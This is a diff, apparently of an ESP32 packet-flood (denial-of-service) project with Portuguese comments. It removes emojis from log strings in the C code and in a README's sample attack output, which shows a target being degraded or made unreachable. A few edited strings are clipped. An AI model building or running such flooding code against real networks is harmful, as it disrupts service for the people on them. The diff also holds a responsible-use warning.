@@ -87,10 +87,10 @@ static void packet_flood_task(void *pvParameters) {
     uint32_t last_stats_time = 0;
     uint32_t packets_this_second = 0;
     
-    ESP_LOGW(TAG, "🌊 INICIANDO PACKET FLOOD!");
-    ESP_LOGW(TAG, "🎯 Alvo: %s", TARGET_IP);
-    ESP_LOGW(TAG, "📦 Tipo: %s", get_flood_type_name(FLOOD_TYPE));
-    ESP_LOGW(TAG, "⚡ Taxa alvo: %d pacotes/segundo", TARGET_PACKET_RATE);
+    ESP_LOGI(TAG, " INICIANDO PACKET FLOOD!");
+    ESP_LOGI(TAG, " Alvo: %s", TARGET_IP);
+    ESP_LOGI(TAG, " Tipo: %s", get_flood_type_name(FLOOD_TYPE));
+    ESP_LOGI(TAG, " Taxa alvo: %d pacotes/segundo", TARGET_PACKET_RATE);
     
     while (packets_sent < MAX_PACKETS && keep_flooding) {
         uint32_t current_time = xTaskGetTickCount() * portTICK_PERIOD_MS;
@@ -122,7 +122,7 @@ static void packet_flood_task(void *pvParameters) {
             packets_this_second++;
             
             if (packets_sent % 100 == 0) {
-                ESP_LOGD(TAG, "💥 Pacote #%d enviado (%d bytes)", 
+                ESP_LOGD(TAG, " Pacote #%d enviado (%d bytes)", 
                          packets_sent, packet_size);
             }
         }
@@ -154,11 +154,11 @@ void adjust_flood_rate(void) {
         if (actual_rate_pps < target_rate_pps * 0.9) {
             // Taxa muito baixa, reduzir delay
             current_delay_ms = (current_delay_ms * 9) / 10;
-            ESP_LOGD(TAG, "📈 Aumentando taxa: delay = %dms", current_delay_ms);
+            ESP_LOGD(TAG, "umentando taxa: delay = %dms", current_delay_ms);
         } else if (actual_rate_pps > target_rate_pps * 1.1) {
             // Taxa muito alta, aumentar delay
             current_delay_ms = (current_delay_ms * 11) / 10;
-            ESP_LOGD(TAG, "📉 Reduzindo taxa: delay = %dms", current_delay_ms);
+            ESP_LOGD(TAG, " Reduzindo taxa: delay = %dms", current_delay_ms);
         }
         
         last_adjustment = current_time;
@@ -185,11 +185,11 @@ void monitor_network_impact(void) {
         uint32_t ping_time = test_ping_latency(TARGET_IP);
         
         if (ping_time == 0) {
-            ESP_LOGW(TAG, "🚨 ALVO INACESSÍVEL - Flood eficaz!");
+            ESP_LOGI(TAG, " ALVO INACESSÍVEL - Flood eficaz!");
             target_unreachable = true;
         } else {
             float degradation = ((float)ping_time / baseline_ping_ms - 1.0) * 100;
-            ESP_LOGI(TAG, "📊 Latência: %dms (degradação: %.1f%%)", 
+            ESP_LOGI(TAG, " Latência: %dms (degradação: %.1f%%)", 
                      ping_time, degradation);
         }
         
@@ -274,47 +274,47 @@ idf.py -p /dev/ttyUSB0 monitor
 
 ### 1. Inicialização do Flood
 ```
-I (2000) PACKET_FLOOD: 🌊 INICIANDO PACKET FLOOD ATTACK! 🌊
-I (2010) PACKET_FLOOD: 🎯 Alvo: 192.168.4.1
-I (2020) PACKET_FLOOD: 📦 Tipo: UDP_FLOOD
-I (2030) PACKET_FLOOD: ⚡ Taxa alvo: 1000 pacotes/segundo
-I (2040) PACKET_FLOOD: 📏 Tamanho do pacote: 1024 bytes
-I (2050) PACKET_FLOOD: ⏱️ Duração máxima: 60 segundos
+I (2000) PACKET_FLOOD:  INICIANDO PACKET FLOOD ATTACK! 
+I (2010) PACKET_FLOOD:  Alvo: 192.168.4.1
+I (2020) PACKET_FLOOD:  Tipo: UDP_FLOOD
+I (2030) PACKET_FLOOD:  Taxa alvo: 1000 pacotes/segundo
+I (2040) PACKET_FLOOD:  Tamanho do pacote: 1024 bytes
+I (2050) PACKET_FLOOD:  Duração máxima: 60 segundos
 ```
 
 ### 2. Baseline de Rede
 ```
-I (3000) PACKET_FLOOD: 📊 Estabelecendo baseline de rede...
-I (3010) PACKET_FLOOD: 🏓 Ping baseline: 15ms
-I (3020) PACKET_FLOOD: 📈 Throughput baseline: 50 Mbps
-I (3030) PACKET_FLOOD: ✅ Baseline estabelecida, iniciando flood...
+I (3000) PACKET_FLOOD:  Estabelecendo baseline de rede...
+I (3010) PACKET_FLOOD:  Ping baseline: 15ms
+I (3020) PACKET_FLOOD: hroughput baseline: 50 Mbps
+I (3030) PACKET_FLOOD:  Baseline estabelecida, iniciando flood...
 ```
 
 ### 3. Execução do Ataque
 ```
-W (5000) PACKET_FLOOD: 💥 Flood iniciado!
-I (6000) PACKET_FLOOD: 📊 Taxa atual: 987 pps (target: 1000 pps)
-I (7000) PACKET_FLOOD: 📦 Pacotes enviados: 1987, Bytes: 2.0 MB
-W (8000) PACKET_FLOOD: 🚨 Latência aumentou para 156ms (+940%)
+W (5000) PACKET_FLOOD:  Flood iniciado!
+I (6000) PACKET_FLOOD:  Taxa atual: 987 pps (target: 1000 pps)
+I (7000) PACKET_FLOOD:  Pacotes enviados: 1987, Bytes: 2.0 MB
+W (8000) PACKET_FLOOD:  Latência aumentou para 156ms (+940%)
 ```
 
 ### 4. Monitoramento de Impacto
 ```
-W (15000) PACKET_FLOOD: 📊 IMPACTO NA REDE:
-W (15010) PACKET_FLOOD: 🏓 Latência: 234ms (baseline: 15ms)
-W (15020) PACKET_FLOOD: 📉 Degradação: 1460%
-W (15030) PACKET_FLOOD: 💔 Perda de pacotes: 12%
-W (15040) PACKET_FLOOD: 🌐 Throughput restante: ~5 Mbps
+W (15000) PACKET_FLOOD:  IMPACTO NA REDE:
+W (15010) PACKET_FLOOD:  Latência: 234ms (baseline: 15ms)
+W (15020) PACKET_FLOOD:  Degradação: 1460%
+W (15030) PACKET_FLOOD:  Perda de pacotes: 12%
+W (15040) PACKET_FLOOD:  Throughput restante: ~5 Mbps
 ```
 
 ### 5. Estatísticas Finais
 ```
-W (60000) PACKET_FLOOD: ✅ PACKET FLOOD CONCLUÍDO!
-W (60010) PACKET_FLOOD: 📦 Total de pacotes: 58,945
-W (60020) PACKET_FLOOD: 📊 Total de bytes: 60.3 MB
-W (60030) PACKET_FLOOD: ⚡ Taxa média: 982 pps
-W (60040) PACKET_FLOOD: 🎯 Eficácia do ataque: 95%
-W (60050) PACKET_FLOOD: 💥 Impacto máximo: SEVERO
+W (60000) PACKET_FLOOD:  PACKET FLOOD CONCLUÍDO!
+W (60010) PACKET_FLOOD:  Total de pacotes: 58,945
+W (60020) PACKET_FLOOD:  Total de bytes: 60.3 MB
+W (60030) PACKET_FLOOD:  Taxa média: 982 pps
+W (60040) PACKET_FLOOD:  Eficácia do ataque: 95%
+W (60050) PACKET_FLOOD:  Impacto máximo: SEVERO
 ```
 
 ## Detecção e Contramedidas
@@ -517,7 +517,7 @@ flood_effectiveness_t effectiveness_table[] = {
 
 ## Uso Responsável
 
-⚠️ **AVISO CRÍTICO**:
+ **AVISO CRÍTICO**:
 - **Autorização Obrigatória**: Nunca execute contra redes não autorizadas
 - **Impacto Real**: Pode causar danos significativos à infraestrutura
 - **Responsabilidade Legal**: Violação pode resultar em processos criminais
